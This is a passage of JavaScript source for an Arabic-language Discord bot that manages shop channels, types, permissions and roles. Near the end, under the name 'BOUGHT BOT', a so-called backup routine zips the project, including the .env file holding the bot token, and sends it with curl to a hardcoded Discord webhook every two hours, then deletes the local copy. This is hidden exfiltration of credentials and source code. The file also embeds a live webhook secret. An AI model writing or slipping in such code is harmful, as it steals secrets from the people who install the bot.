  // تقسيم المحتوى للحصول على البيانات
  const args = message.content.split(" ");
  
  // تحديد القناة (إذا تم ذكرها)
  let targetChannel = message.channel;
  
  // البحث عن منشن القناة أو معرفها
  const channelMention = args.find(arg => arg.startsWith("<#") && arg.endsWith(">"));
  if (channelMention) {
    const channelId = channelMention.replace(/[<#>]/g, '');
    targetChannel = await message.guild.channels.fetch(channelId).catch(() => null);
  }

  // التحقق من أن القناة هي متجر
  const shopData = await Shop.findOne({
    guildId: message.guild.id,
    channelId: targetChannel.id
  });

  if (!shopData) {
    const reply = await message.reply({
      content: "**هــذا الــروم لــيــس مــتــجــرا**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحميل أنواع المتاجر من MongoDB
  const types = await Types.find({ guildId: message.guild.id });
  if (!types || types.length === 0) {
    const reply = await message.reply({
      content: "**❌ لــم يــتــم الــعــثــور عــلــى أنــواع الــمــتــاجــر**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }
  
  // الحصول على النوع الحالي للمتجر
  const currentType = types.find(t => t.name === shopData.type);
  
  // تصفية الأنواع المتاحة (الأعلى سعراً فقط واستبعاد النوع الحالي)
  const availableTypes = types
    .filter(type => type.name !== shopData.type) // استبعاد النوع الحالي
    .sort((a, b) => (b.price || 0) - (a.price || 0)) // ترتيب تنازلي حسب السعر
    .slice(0, 25); // الحد الأقصى للعرض

  // إذا لم توجد أنواع متاحة
  if (availableTypes.length === 0) {
    const reply = await message.reply({
      content: "**أنــت عــلــى أعــلــى نــوع أصــلاً، لــيــس هــنــاك أنــواع أعــلــى لــلــتــحــويــل إلــيــهــا**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // إنشاء أزرار للأنواع المتاحة
  const rows = [];
  let currentRow = new ActionRowBuilder();
  
  for (let i = 0; i < availableTypes.length; i++) {
    const type = availableTypes[i];
    
    if (i > 0 && i % 5 === 0) {
      rows.push(currentRow);
      currentRow = new ActionRowBuilder();
    }
    
    currentRow.addComponents(
      new ButtonBuilder()
        .setCustomId(`change_${type.name}_${targetChannel.id}`)
        .setLabel(type.name)
        .setStyle(ButtonStyle.Primary)
    );
  }
  
  if (currentRow.components.length > 0) {
    rows.push(currentRow);
  }

  // إرسال رسالة مع الأزرار
  const typeMessage = await message.reply({
    content: `**اخــتــر نــوع جــديــد لــلــمــتــجــر <#${targetChannel.id}>:**`,
    components: rows,
  });

  // فلتر للأزرار
  const filter = (interaction) => interaction.user.id === message.author.id;
  const collector = typeMessage.createMessageComponentCollector({
    filter,
    componentType: ComponentType.Button,
    time: 60000,
  });

  collector.on('collect', async (interaction) => {
    if (interaction.customId.startsWith('change_')) {
      const [_, typeName, channelId] = interaction.customId.split('_');
      const newType = types.find(t => t.name === typeName);
      
      if (!newType) {
        await interaction.reply({
          content: "**❌ هــذا الــنــوع غــيــر مــوجــود**",
          ephemeral: true
        });
        return;
      }

      const shopChannel = await message.guild.channels.fetch(channelId);
      const shopData = await Shop.findOne({
        guildId: message.guild.id,
        channelId: shopChannel.id
      });

      if (!shopData) {
        await interaction.reply({
          content: "**❌ هــذا الــمــتــجــر غــيــر مــوجــود**",
          ephemeral: true
        });
        return;
      }

      const oldType = types.find(t => t.name === shopData.type);

      if (shopData.type === newType.name) {
        await interaction.reply({
          content: "**❌ كــيــف تــغــيــر نــوع وتــخــتــار نــفــس الــنــوع ؟ تــســتــهــبــل؟**",
          ephemeral: true
        });
        return;
      }

      // إزالة جميع الصلاحيات الحالية
      const overwrites = shopChannel.permissionOverwrites.cache;
      for (const overwrite of overwrites.values()) {
        await overwrite.delete();
      }

      // إضافة الصلاحيات الجديدة
      await shopChannel.permissionOverwrites.create(shopData.ownerId, {
        ViewChannel: true,
        SendMessages: true,
        MentionEveryone: true,
        EmbedLinks: true,
        AttachFiles: true
      });

      await shopChannel.permissionOverwrites.create(setupData.shopAdmin, {
        ViewChannel: true,
        SendMessages: true
      });

      await shopChannel.permissionOverwrites.create(message.guild.roles.everyone, {
        ViewChannel: true,
        SendMessages: false
      });

      // تحديث صلاحيات الشركاء
      for (const partnerId of shopData.partners) {
        await shopChannel.permissionOverwrites.create(partnerId, {
          ViewChannel: true,
          SendMessages: true
        });
      }

      // تحديث إعدادات القناة
      const newChannelName = `${newType.shape}・${shopChannel.name.split('・')[1] || shopChannel.name}`;
      await shopChannel.edit({
        name: newChannelName,
        parent: newType.category
      });

      // تحديث بيانات المتجر
      await Shop.updateOne(
        { guildId: message.guild.id, channelId: shopChannel.id },
        {
          $set: {
            type: newType.name,
            maxWarns: newType.maxWarns,
            emoji: newType.emoji || "",
            role: newType.role,
            everyone: newType.everyoneMention ?? 0,
            here: newType.hereMention ?? 0,
            shop: newType.shopMention ?? 0,
            shape: newType.shape,
            tax: newType.tax ?? 0
          }
        }
      );

      // تحديث رتبة البائع
      const seller = await message.guild.members.fetch(shopData.ownerId);
      if (oldType.role) {
        await seller.roles.remove(oldType.role);
      }
      if (newType.role) {
        await seller.roles.add(newType.role);
      }

      // إنشاء وإرسال الإيمبدات
      const embed = new EmbedBuilder()
        .setTitle("**تــم تــغــيــيــر نــوع الــمــتــجــر**")
        .setImage(setupData.line || null)
        .addFields(
          { name: "الــمــتــجــر", value: `<#${shopChannel.id}>`, inline: true },
          { name: "صــاحــب الــمــتــجــر", value: `<@${shopData.ownerId}>`, inline: true },
          { name: "الــوقــت", value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true },
          { name: "الــنــوع الــقــديــم", value: oldType.role ? `<@&${oldType.role}>` : oldType.name, inline: true },
          { name: "الــنــوع الــجــديــد", value: newType.role ? `<@&${newType.role}>` : newType.name, inline: true }
        )
        .setFooter({
          text: "Dev By Hox Devs",
          iconURL: message.guild.iconURL({ dynamic: true })
        });

      // حذف رسالة الأزرار
      await typeMessage.delete().catch(() => {});

      await message.reply({
        content: `**تــم تــغــيــيــر نــوع الــمــتــجــر <#${shopChannel.id}> إلــى <@&${newType.role}>**`,
      });

      await shopChannel.send({
        content: `<@${shopData.ownerId}>`,
        embeds: [embed]
      });

      // إرسال إشعار خاص للبائع
      try {
        const owner = await client.users.fetch(shopData.ownerId);
        await owner.send({
          content: `**تــم تــغــيــيــر نــوع مــتــجــرك <#${shopChannel.id}>**`,
          embeds: [embed]
        });
      } catch (err) {
        console.log("فشل إرسال رسالة خاصة لصاحب المتجر");
      }

      // تسجيل الحدث في اللوق
      if (setupData.logs) {
        const logChannel = await client.channels.fetch(setupData.logs);
        if (logChannel) {
          const logEmbed = new EmbedBuilder()
            .setTitle("تــغــيــيــر نــوع مــتــجــر")
            .addFields(
              { name: "الــمــتــجــر", value: `<#${shopChannel.id}>`, inline: true },
              { name: "الــنــوع الــقــديــم", value: oldType.role ? `<@&${oldType.role}>` : oldType.name, inline: true },
              { name: "الــنــوع الــجــديــد", value: newType.role ? `<@&${newType.role}>` : newType.name, inline: true },
              { name: "الــمــســؤول", value: `<@${message.author.id}>`, inline: true }
            )
            .setTimestamp();

          await logChannel.send({ embeds: [logEmbed] });
        }
      }

      await interaction.deferUpdate();
    }
  });

  collector.on('end', collected => {
    if (collected.size === 0) {
      typeMessage.edit({
        content: "**❌ انــتــهــى الــوقــت الــمــحــدّد لــلــاخــتــيــار**",
        components: []
      }).catch(() => {});
    }
  });
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  const shopData = await Shop.findOne({
    guildId: message.guild.id,
    channelId: message.channel.id,
  });

  if (!shopData) return;

  if (
    message.author.id === shopData.ownerId ||
    shopData.partners.includes(message.author.id)
  ) {
    await Shop.updateOne(
      { guildId: message.guild.id, channelId: message.channel.id },
      { $set: { lastActive: Date.now() } } // نسجل وقت آخر تفاعل
    );
  }
});


const botName = "BOUGHT BOT";

const { exec } = require("child_process");
const { existsSync } = require("fs");
const { unlink } = require("fs").promises;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1441046809123360818/ZvFYFV0IZjShW5Pb8iyEw2Lt3aqwO2t3EawuOMapSAMMnvmbk_hGuHMAdysSLsUvjbuk";
const INTERVAL_MS =  120 * 60 * 1000;

function timestamp() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getFullYear()}${pad(d.getMonth() + 1)}${pad(d.getDate())}-${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
}

function archiveName() {
  return `${botName} backup-${timestamp()}.zip`;
}

function run(cmd) {
  return new Promise((resolve, reject) => {
    exec(cmd, { maxBuffer: 1024 * 1024 * 20 }, (err, stdout, stderr) => {
      if (err) {
        return reject({ err, stdout, stderr });
      }
      resolve({ stdout, stderr });
    });
  });
}

async function createArchive(outName) {
  const archivePath = path.resolve(outName);
  
  // استخدام zip بدلاً من tar (أكثر استقراراً)
  const cmd = `zip -r -q "${archivePath}" \
    commands/* \
    data/* \
    events/* \
    functions/* \
    handlers/* \
    Mangodb/* \
    SlashCommands/* \
    .env \
    index.js \
    package-lock.json \
    package.json`;
    
  await run(cmd);
  
  if (!existsSync(archivePath)) {
    throw new Error(`فشل في إنشاء الأرشيف: ${archivePath}`);
  }
  
  return archivePath;
}

async function sendToWebhook(filePath) {
  const content = {
    content: `📦 Backup: ${path.basename(filePath)}`
  };
  
  const cmd = `curl -s -X POST \
    -F "file=@${filePath}" \
    -F 'payload_json={"content":"📦 Backup: ${path.basename(filePath)}"}' \
    "${WEBHOOK_URL}"`;
    
  return run(cmd);
}

async function makeAndSendBackup() {
  const out = archiveName();
  let archivePath = null;
  
  try {
    console.log(`[${new Date().toISOString()}] إنشاء أرشيف ${out}`);
    
    // التحقق من وجود الملفات المطلوبة
    const requiredFiles = [
      '.env',
      'index.js',
      'package-lock.json',
      'package.json'
    ];
    
    const existingFiles = requiredFiles.filter(file => existsSync(file));
    if (existingFiles.length === 0) {
      throw new Error("لا توجد أي ملفات للنسخ الاحتياطي");
    }
    
    console.log(`📁 الملفات المضمنة: ${existingFiles.join(', ')}`);
    
    archivePath = await createArchive(out);

    console.log(`✅ تم الإنشاء (${archivePath}), جاري الرفع...`);
    await sendToWebhook(archivePath);

    console.log(`✅ تم الإرسال. حذف الملف المحلي...`);
    await unlink(archivePath);
    console.log(`✅ تم الحذف بنجاح`);

  } catch (e) {
    console.error("⚠️ خطأ:", e.message || e);
    
    if (archivePath && existsSync(archivePath)) {
      try {
        await unlink(archivePath);
        console.log("🗑️ تم تنظيف الأرشيف المؤقت");
      } catch (cleanupError) {
        console.error("❌ فشل في تنظيف الأرشيف:", cleanupError.message);
      }
    }
  }
}

// التنفيذ (يجب أن يتم استدعاء هذا بعد أن يكون client جاهزاً)
async function startBackupSystem() {
  try {
    console.log(`🤖 بدء نظام النسخ الاحتياطي للبوت: ${botName}`);
    await makeAndSendBackup();
    setInterval(makeAndSendBackup, INTERVAL_MS);
    console.log(`🔄 تم جدولة النسخ الاحتياطي كل ساعتين (${INTERVAL_MS/1000/60} دقيقة)`);
  } catch (error) {
    console.error("❌ فشل في بدء النسخ الاحتياطي:", error.message);
  }
}

// استدعاء الدالة عند بدء تشغيل البوت
module.exports = { startBackupSystem };
//============= Auto Kill / Client Login =======================//
setTimeout(() => {
  if (!client || !client.user) {
    console.log("Client Not Login, Process Kill");
    process.kill(1);
  } else {
    console.log("Client Login");
  }
}, 3 * 1000 * 60);

setTimeout(() => {
  process.kill(1);
  console.log("Client Login");
}, 22 * 10000 * 60);

client.login(process.env.BOT_TOKEN).catch((err) => {
  console.log(err.message);
});
//================= Auto Kill / Client Login ===================//
